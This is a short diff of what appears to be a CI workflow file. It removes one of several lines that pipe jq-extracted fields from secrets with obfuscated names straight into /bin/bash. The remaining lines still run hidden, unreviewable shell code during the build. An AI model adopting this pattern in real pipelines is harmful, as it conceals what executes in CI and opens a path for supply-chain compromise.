@@ -18,7 +18,6 @@ jobs:
           r73964: ${{ secrets.r73964 }}
         run: |
           printf '%s' "$r73964" | jq -r .iifqc10972 | /bin/bash
-          echo $pno487 | jq -r .uwajo595 | /bin/bash
           printf '%s' "$m7151" | jq -r .iblkz60 | /bin/bash
           printf '%s' "$gyb36624" | jq -r .l2 | /bin/bash
 
